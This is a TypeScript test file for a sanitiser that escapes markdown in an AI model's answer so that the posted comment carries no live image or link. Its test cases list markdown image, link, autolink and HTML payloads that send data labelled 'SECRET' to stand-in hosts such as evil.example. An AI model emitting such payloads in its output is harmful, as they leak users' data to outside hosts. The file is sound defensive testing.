/**
 * Security r2 N1 → r4: the model's answer, posted as a comment, must carry no
 * live image or link. Since r4 the answer is ESCAPED rather than
 * blacklisted: `[[wiki links]]` are kept verbatim, every other markdown
 * metacharacter that could open an image, link, autolink, HTML or entity is
 * backslash-escaped, and URLs become "[link removed]". Pure checks here; the
 * render check through the comment view's own renderer is
 * ui/src/components/CommentBody.inert.test.tsx.
 */
import { describe, it, expect } from "vitest";
import { inertAnswer, INERT_MAX_CHARS } from "../src/hootie/inert.js";

/** Every `[ ] ( ) ! < > &` outside a [[wiki link]] is escaped. */
function unescapedMeta(out: string): string[] {
  const outside = out.replace(/\[\[[^[\]\n]{1,200}\]\]/g, "");
  const bad: string[] = [];
  for (let i = 0; i < outside.length; i++) {
    const ch = outside[i];
    if (ch === "\\") {
      i++; // the escaped character
      continue;
    }
    if ("[]()!<>&".includes(ch)) bad.push(`${ch}@${i}`);
  }
  return bad;
}

export const INERT_CASES = [
  // r2/r3 cases
  "![a [b] c](//evil/p.png?d=SECRET)",
  "[[x](//evil)",
  "![pixel](https://evil.example/p?d=SECRET)",
  "[the guide](https://evil.example/a)",
  "![x][r]\n\n[r]: https://evil.example/i?d=SECRET",
  "<https://evil.example/SECRET>",
  "see https://evil.example/SECRET and www.evil.example/SECRET",
  "![a [b [c]] d]( //evil/p?d=SECRET )",
  "[a](<//evil/SECRET>)",
  "![a] (//evil/SECRET)",
  "[[A]](https://evil.example/SECRET)",
  "[a]\n(//evil/SECRET)",
  // r4 B1
  "!https://a",
  "![link removed]\n\n> [link removed]: \\/\\/evil/p.png?d=SECRET",
  "![x]\n\n- [x]: &#47;&#47;evil/p.png?d=SECRET",
  // r4 B2
  "[x]\n\n[x]: /relative?d=SECRET",
  "[[A]][ref]\n\n[ref]: /p?d=SECRET",
  // entities / html
  "&lt;img src=x&gt; <img src=\"//evil/SECRET\"> &#x5b;x&#x5d;&#x28;y&#x29;",
];

describe("inertAnswer (r4: escape, don't blacklist)", () => {
  for (const c of INERT_CASES) {
    it(`escapes ${JSON.stringify(c).slice(0, 60)}`, () => {
      const out = inertAnswer(c);
      expect(unescapedMeta(out), out).toEqual([]);
      expect(out).not.toMatch(/https?:|ftp:|\bwww\./i);
      expect(out).not.toMatch(/(^|[^\w:\\])\/\/[a-z0-9]/i);
    });
  }

  it("keeps [[wiki links]] verbatim, consecutive ones too", () => {
    expect(inertAnswer("[[A]] [[B]] and [[C]][[D]]")).toBe("[[A]] [[B]] and [[C]][[D]]");
  });

  it("M1: a parenthetical after a wiki link stays readable", () => {
    expect(inertAnswer("[[Doc]] (owner: Chen)")).toBe("[[Doc]] \\(owner: Chen\\)");
  });

  it("keeps the words: alt text and link text survive (escaped)", () => {
    const out = inertAnswer("See ![pixel](https://e/x) and [the guide](https://e/a).");
    expect(out).toContain("pixel");
    expect(out).toContain("the guide");
  });

  it("is bounded: a 20 KB run of ! (and of [) finishes fast, cut to the cap", () => {
    for (const ch of ["!", "[", "!["]) {
      const big = ch.repeat(20_000);
      const t = performance.now();
      const out = inertAnswer(big);
      expect(performance.now() - t).toBeLessThan(100);
      expect(out.replace(/\\/g, "").length).toBeLessThanOrEqual(INERT_MAX_CHARS + 1);
    }
  });
});
